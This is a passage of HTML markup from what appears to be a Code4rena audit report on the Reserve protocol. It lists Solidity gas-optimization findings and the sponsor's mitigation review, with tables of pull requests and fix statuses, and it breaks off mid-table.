href=\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27\">https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27</a></p>\n<p>Use <code>uint256(1)</code> and <code>uint256(2)</code> for true/false to avoid a Gwarmaccess (<strong><a href=\"https://gist.github.com/IllIllI000/1b70014db712f8572a72378321250058\">100 gas</a></strong>) for the extra SLOAD, and to avoid Gsset (<strong>20000 gas</strong>) when changing from <code>false</code> to <code>true</code>, after having been <code>true</code> in the past.</p>\n<p><em>There are 4 instances of this issue.</em></p>\n<h2 id=\"g34-using--0-costs-more-gas-than--0-when-used-on-a-uint-in-a-require-statement\" style=\"position:relative;\"><a href=\"#g34-using--0-costs-more-gas-than--0-when-used-on-a-uint-in-a-require-statement\" aria-label=\"g34 using  0 costs more gas than  0 when used on a uint in a require statement permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑34] Using <code>> 0</code> costs more gas than <code>!= 0</code> when used on a <code>uint</code> in a <code>require()</code> statement</h2>\n<p>This change saves <strong><a href=\"https://aws1.discourse-cdn.com/business6/uploads/zeppelin/original/2X/3/363a367d6d68851f27d2679d10706cd16d788b96.png\">6 gas</a></strong> per instance. The optimization works until solidity version <a href=\"https://gist.github.com/IllIllI000/bf2c3120f24a69e489f12b3213c06c94\">0.8.13</a> where there is a regression in gas costs.</p>\n<p><em>There are 11 instances of this issue.</em></p>\n<h2 id=\"g35-i-costs-less-gas-than-i-especially-when-its-used-in-for-loops---ii---too\" style=\"position:relative;\"><a href=\"#g35-i-costs-less-gas-than-i-especially-when-its-used-in-for-loops---ii---too\" aria-label=\"g35 i costs less gas than i especially when its used in for loops   ii   too permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑35] <code>++i</code> costs less gas than <code>i++</code>, especially when it’s used in <code>for</code>-loops (<code>--i</code>/<code>i--</code> too)</h2>\n<p>Saves <strong>5 gas per loop</strong></p>\n<p><em>There are 11 instances of this issue.</em></p>\n<h2 id=\"g36-using-private-rather-than-public-for-constants-saves-gas\" style=\"position:relative;\"><a href=\"#g36-using-private-rather-than-public-for-constants-saves-gas\" aria-label=\"g36 using private rather than public for constants saves gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑36] Using <code>private</code> rather than <code>public</code> for constants, saves gas</h2>\n<p>If needed, the values can be read from the verified contract source code, or if there are multiple values there can be a single getter function that <a href=\"https://github.com/code-423n4/2022-08-frax/blob/90f55a9ce4e25bceed3a74290b854341d8de6afa/src/contracts/FraxlendPair.sol#L156-L178\">returns a tuple</a> of the values of all currently-public constants. Saves <strong>3406-3606 gas</strong> in deployment gas due to the compiler not having to create non-payable getter functions for deployment calldata, not having to store the bytes of the value outside of where it’s used, and not adding another entry to the method ID table.</p>\n<p><em>There are 33 instances of this issue.</em></p>\n<h2 id=\"g37-division-by-two-should-use-bit-shifting\" style=\"position:relative;\"><a href=\"#g37-division-by-two-should-use-bit-shifting\" aria-label=\"g37 division by two should use bit shifting permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑37] Division by two should use bit shifting</h2>\n<p><code>&#x3C;x> / 2</code> is the same as <code>&#x3C;x> >> 1</code>. While the compiler uses the <code>SHR</code> opcode to accomplish both, the version that uses division incurs an overhead of <a href=\"https://gist.github.com/IllIllI000/ec0e4e6c4f52a6bca158f137a3afd4ff\"><strong>20 gas</strong></a> due to <code>JUMP</code>s to and from a compiler utility function that introduces checks which can be avoided by using <code>unchecked {}</code> around the division by two.</p>\n<p><em>There are 8 instances of this issue.</em></p>\n<h2 id=\"g38-use-custom-errors-rather-than-revertrequire-strings-to-save-gas\" style=\"position:relative;\"><a href=\"#g38-use-custom-errors-rather-than-revertrequire-strings-to-save-gas\" aria-label=\"g38 use custom errors rather than revertrequire strings to save gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑38] Use custom errors rather than <code>revert()</code>/<code>require()</code> strings to save gas</h2>\n<p>Custom errors are available from solidity version 0.8.4. Custom errors save <a href=\"https://gist.github.com/IllIllI000/ad1bd0d29a0101b25e57c293b4b0c746\"><strong>~50 gas</strong></a> each time they’re hit by <a href=\"https://blog.soliditylang.org/2021/04/21/custom-errors/#errors-in-depth\">avoiding having to allocate and store the revert string</a>. Not defining the strings also save deployment gas.</p>\n<p><em>There are 151 instances of this issue.</em></p>\n<h2 id=\"g39-functions-guaranteed-to-revert-when-called-by-normal-users-can-be-marked-payable\" style=\"position:relative;\"><a href=\"#g39-functions-guaranteed-to-revert-when-called-by-normal-users-can-be-marked-payable\" aria-label=\"g39 functions guaranteed to revert when called by normal users can be marked payable permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑39] Functions guaranteed to revert when called by normal users can be marked <code>payable</code></h2>\n<p>If a function modifier such as <code>onlyOwner</code> is used, the function will revert if a normal user tries to pay the function. Marking the function as <code>payable</code> will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are\n<code>CALLVALUE</code>(2),<code>DUP1</code>(3),<code>ISZERO</code>(3),<code>PUSH2</code>(3),<code>JUMPI</code>(10),<code>PUSH1</code>(3),<code>DUP1</code>(3),<code>REVERT</code>(0),<code>JUMPDEST</code>(1),<code>POP</code>(2), which costs an average of about <strong>21 gas per call</strong> to the function, in addition to the extra deployment cost.</p>\n<p><em>There are 12 instances of this issue.</em></p>\n<hr>\n<h1 id=\"mitigation-review\" style=\"position:relative;\"><a href=\"#mitigation-review\" aria-label=\"mitigation review permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Mitigation Review</h1>\n<h2 id=\"introduction\" style=\"position:relative;\"><a href=\"#introduction\" aria-label=\"introduction permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Introduction</h2>\n<p>Following the C4 audit contest, 3 wardens (0xA5DF, HollaDieWaldfee, and <a href=\"https://twitter.com/akshaysrivastv\">AkshaySrivastav</a>) reviewed the mitigations for all identified issues. Additional details can be found within the <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest\">C4 Reserve Versus Mitigation Review contest repository</a>.</p>\n<h2 id=\"overview-of-changes\" style=\"position:relative;\"><a href=\"#overview-of-changes\" aria-label=\"overview of changes permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Overview of Changes</h2>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest#overview-of-changes\">Summary from the Sponsor</a>:</strong></p>\n<blockquote>\n<p>The sponsors have made many, many changes, in response to the thoughtful feedback from the Wardens. In most cases changes were straightforward and of limited scope, but in at least two cases there were significant reductions or simplifications of large portions of the code. These areas are expanded upon below in their own sections. The 3rd section will cover everything else:</p>\n<h3 id=\"1-removal-of-non-atomic-rtoken-issuance-m-13-m-15\" style=\"position:relative;\"><a href=\"#1-removal-of-non-atomic-rtoken-issuance-m-13-m-15\" aria-label=\"1 removal of non atomic rtoken issuance m 13 m 15 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>1. Removal of non-atomic RToken issuance (M-13, M-15)</h3>\n<p><a href=\"https://github.com/reserve-protocol/protocol/pull/571\">PR #571: remove non-atomic issuance</a></p>\n<p>This audit, as in previous audits (<a href=\"https://github.com/code-423n4/2023-01-reserve/blob/main/audits/Trail%20of%20Bits%20-%20Aug%2011%202022.pdf\">ToB</a>; <a href=\"https://github.com/code-423n4/2023-01-reserve/blob/main/audits/Solidified%20-%20Oct%2016%202022.pdf\">Solidified</a>) problems were found with the RToken issuance queue, a fussy cumulative data structure that exists to support constant-time <code>cancel()</code> and <code>vest()</code> operations for non-atomic issuance. This audit too, another issue was discovered with <strong>M-13</strong>. This prompted us to look for alternatives that achieve a similar purpose to the issuance queue, leading to removal of non-atomic issuance entirely and creation of the issuance throttle. The issuance throttle is at a low-level mechanistically similar to the redemption battery from before, except it is a <em>net hourly issuance</em> measure. This addresses the problem of ingesting large amounts of bad collateral too quickly in a different way and with less frictions for users, both in terms of time and gas fees. </p>\n<p>As wardens will see, large portions of the <code>RToken</code> contract code have been removed. This also freed up contract bytecode real estate that allowed us to take libraries internal that were previously external. </p>\n<p><strong>Context: Original purpose of issuance queue</strong></p>\n<p>The original purpose of the issuance queue was to prevent MEV searchers and other unspeakables from depositing large amounts of collateral right before the basket becomes IFFY and issuance is turned off. The overall IFFY -> DISABLED basket flow can be frontrun, and even though the depositer does not know yet whether a collateral token will default, acquiring a position in the queue acts like a valuable option that pays off if it does and has only opportunity cost otherwise. From the protocol’s perspective, this kind of issuance just introduces bad debt. </p>\n<p>The new issunce throttle is purely atomic and serves the same purpose of limiting the loss due to bad debt directly prior to a collateral default. </p>\n<h3 id=\"2-tightening-of-the-basket-range-formula-h-02-m-20-m-22\" style=\"position:relative;\"><a href=\"#2-tightening-of-the-basket-range-formula-h-02-m-20-m-22\" aria-label=\"2 tightening of the basket range formula h 02 m 20 m 22 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>2. Tightening of the basket range formula (H-02, M-20, M-22)</h3>\n<p><a href=\"https://github.com/reserve-protocol/protocol/pull/585\">PR #585: Narrow bu band</a></p>\n<p>H-02 is the other highly consequential change, from a sheer quantity of SLOC point of view. Indeed, the calculation of the top and bottom of the basket range was highly inefficient and would generally result in larger haircuts than desirable. Below are two datapoints from tests that show the severity of a haircut after default in the absence of RSR overcollateralization:</p>\n<ul>\n<li><strong>37.5%</strong> loss +  market-even trades</li>\n<li>Before: <strong>39.7%</strong> haircut</li>\n<li>After: <strong>37.52%</strong> haircut</li>\n<li><strong>15%</strong> loss + worst-case below market trades</li>\n<li>Before: <strong>17.87%</strong> haircut</li>\n<li>After: <strong>16.38%</strong> haircut</li>\n</ul>\n<p>The previous code was more complicated, more costly, and provided worse outcomes. In short this was because it didn’t distinguish between capital that needed to be traded vs capital that did not. While the protocol cannot know ahead of time exactly how many BUs it will have after recollateralization, it can use the number of basket units currently held as a bedrock that it knows it will not need to trade, and thus do not differentially contribute to <code>basket.top</code> and <code>basket.bottom</code>. </p>\n<p><strong>Related issues</strong></p>\n<p>In addition to H-02 this PR also addressed M-20 and M-22, which are related to the calculation of the dust loss and potential overflow during the shortfall calculation. The calculation of the dust loss is now capped appropriately and the shortfall calculation has been eliminated. </p>\n<h3 id=\"3-everything-else\" style=\"position:relative;\"><a href=\"#3-everything-else\" aria-label=\"3 everything else permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>3. Everything else</h3>\n<p>The mitigations for the remaining issues were more narrow in scope. Most do not require further context or description. But there are 2 smaller clusters of changes worth calling out:</p>\n<p><strong>Universal Revenue Hiding</strong></p>\n<p><a href=\"https://github.com/reserve-protocol/protocol/pull/620\">PR #620: Universal revenue hiding</a></p>\n<p>As a warden pointed out in H-01, there are subtleties that can cause the compound v2 cToken rate to decrease, albeit by extremely little. Since we have dealt with Compund V2 for so long, and only just discovered this detail, we reason there are probably more like it. </p>\n<p>To this end we’ve implemented universal revenue hiding at the collateral plugin level, for all appreciating collateral. The idea is that even a small amount of revenue hiding such as 1-part-in-1-million may end up protecting the collateral plugin from unexpected default while being basically undetectable to humans. </p>\n<p>We mention this change because it can potentially impact other areas of the protocol, such as what prices trades are opened at, or how the basket range is calculated during recollateralization. A warden looking to examine this should focus their attention on <code>contracts/assets/AppreciatingFiatCollateral.sol</code>. </p>\n<p><strong>Redemption while DISABLED</strong></p>\n<p><a href=\"https://github.com/reserve-protocol/protocol/pull/575\">PR #575: support redemption while disabled</a></p>\n<p>The final change area to bring attention to is the enabling of RToken redemption while the basket is DISABLED. The motivation for this change is not neatly captured in a single contest issue, though it was something discussed with wardens via DM, and which seems tangentially related to issues like M-03.</p>\n<p>Previous behavior: Cannot redeem while DISABLED. <code>BasketHandler.refreshBasket()</code> must be called before first redemption can occur, and even then, the redeemer must wait until trading finishes to receive full redemptions. </p>\n<p>Current behavior: Can redeem while DISABLED. Will get full share of collateral until <code>BasketHandler.refreshBasket()</code> is called. Can use <code>revertOnPartialRedemption</code> redemption param to control behavior along this boundary. </p>\n<p>We mention this change because functionality under different basket conditions is central to the functioning of our protocol. RToken redemption is how capital primarily exits the system, so any change to this area is fundamentally risky. </p>\n<p>A related change is that <code>BasketHandler._switchBasket()</code> now skips over IFFY collateral.</p>\n</blockquote>\n<h2 id=\"mitigation-review-scope\" style=\"position:relative;\"><a href=\"#mitigation-review-scope\" aria-label=\"mitigation review scope permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Mitigation Review Scope</h2>\n<table>\n<thead>\n<tr>\n<th>URL</th>\n<th>Mitigation of</th>\n<th>Purpose</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><a href=\"https://github.com/reserve-protocol/protocol/pull/571\">https://github.com/reserve-protocol/protocol/pull/571</a></td>\n<td>M-13, M-15</td>\n<td>This PR removes the non-atomic issuance mechanism and adds an issuance throttle. The redemption battery is rebranded to a redemption throttle.</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/reserve-protocol/protocol/pull/585\">https://github.com/reserve-protocol/protocol/pull/585</a></td>\n<td>H-02, M-20, M-22</td>\n<td>This PR simplifies and improves the basket range formula. The new logic should provide much tighter basket range estimates and result in smaller haircuts.</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/reserve-protocol/protocol/pull/584\">https://github.com/reserve-protocol/protocol/pull/584</a></td>\n<td>M-01, M-12, M-23, M-25</td>\n<td>This PR bundles mitigations for many small issues together. The full list is in the PR description. Each of these items are small and local in scope.</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/reserve-protocol/protocol/pull/575\">https://github.com/reserve-protocol/protocol/pull/575</a></td>\n<td>M-24</td>\n<td>This PR enables redemption while the basket is DISABLED.</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/reserve-protocol/protocol/pull/614\">https://github.com/reserve-protocol/protocol/pull/614</a></td>\n<td>M-18</td>\n<td>This PR removes the ability to change StRSR token’s name and symbol.</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/reserve-protocol/protocol/pull/615\">https://github.com/reserve-protocol/protocol/pull/615</a></td>\n<td>M-03, M-04</td>\n<td>This PR allows an RToken redeemer to specify when they require full redemptions vs accept partial (prorata) redemptions.</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/reserve-protocol/protocol/pull/617\">https://github.com/reserve-protocol/protocol/pull/617</a></td>\n<td>M-02</td>\n<td>This PR prevents paying out StRSR rewards until the StRSR supply is at least 1e18.</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/reserve-protocol/protocol/pull/619\">https://github.com/reserve-protocol/protocol/pull/619</a></td>\n<td>M-05</td>\n<td>This PR prevents melting RToken until the RToken supply is at least 1e18.</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/reserve-protocol/protocol/pull/620\">https://github.com/reserve-protocol/protocol/pull/620</a></td>\n<td>H-01</td>\n<td>This PR adds universal revenue hiding to all appreciating collateral.</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/reserve-protocol/protocol/pull/622\">https://github.com/reserve-protocol/protocol/pull/622</a></td>\n<td>M-11</td>\n<td>This PR adds a Furnace.melt()/StRSR.payoutRewards() step when governance changes the rewardRatio.</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/reserve-protocol/protocol/pull/623\">https://github.com/reserve-protocol/protocol/pull/623</a></td>\n<td>M-16, M-21</td>\n<td>This PR makes the AssetRegistry more resilient to bad collateral during asset unregistration, and disables staking when frozen.</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/reserve-protocol/protocol/pull/628\">https://github.com/reserve-protocol/protocol/pull/628</a></td>\n<td>M-10</td>\n<td>This PR makes all dangerous uint192 downcasts truncation-safe.</td>\n</tr>\n</tbody>\n</table>\n<p>*Note from the sponsor: we want to emphasize this is <strong>not</strong> the complete list of changes between the original <a href=\"https://github.com/reserve-protocol/protocol/commit/df7ecadc2bae74244ace5e8b39e94bc992903158\">df7eca commit</a> and the mitigation review <a href=\"https://github.com/reserve-protocol/protocol/commit/27a3472d553b4fa54f896596007765ec91941348\">27a347 commit</a>. While it is the <strong>vast majority</strong> of the changes, we urge wardens to check out the diff between the two commits for themselves, as changes may have been made due to addressing gas/QA findings.*</p>\n<h2 id=\"mitigation-review-summary\" style=\"position:relative;\"><a href=\"#mitigation-review-summary\" aria-label=\"mitigation review summary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Mitigation Review Summary</h2>\n<table>\n<thead>\n<tr>\n<th>Original Issue</th>\n<th>Status</th>\n<th>Full Details</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/310\">H-01</a></td>\n<td>Mitigation confirmed w/ comments</td>\n<td>Reports from <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/35\">HollaDieWaldfee</a>, <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/23\">0xA5DF</a>, and <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/25\">AkshaySrivastav</a></td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/235\">H-02</a></td>\n<td>Not fully mitigated</td>\n<td>Report from <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/49\">0xA5DF</a>, and also shared below</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/452\">M-01</a></td>\n<td>Mitigation confirmed</td>\n<td>Reports from <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/50\">0xA5DF</a>, <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/16\">HollaDieWaldfee</a>, and <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/26\">AkshaySrivastav</a></td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/439\">M-02</a></td>\n<td>Mitigation confirmed w/ comments</td>\n<td>Reports from <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/51\">0xA5DF</a>, <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/20\">HollaDieWaldfee</a>, and <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/27\">AkshaySrivastav</a></td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/416\">M-03</a></td>\n<td>This is a duplicate, see M-04 for status</td>\n<td><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/416#issuecomment-1428777177\">Comment from judge</a></td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/399\">M-04</a></td>\n<td>Not fully mitigated</td>\n<td>Reports from <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/54\">0xA5DF</a>, <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/14\">HollaDieWaldfee</a>, and <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/69\">AkshaySrivastav</a>, and also shared below</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/384\">M-05</a></td>\n<td>Not fully mitigated</td>\n<td>Reports from <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/13\">HollaDieWaldfee</a> and 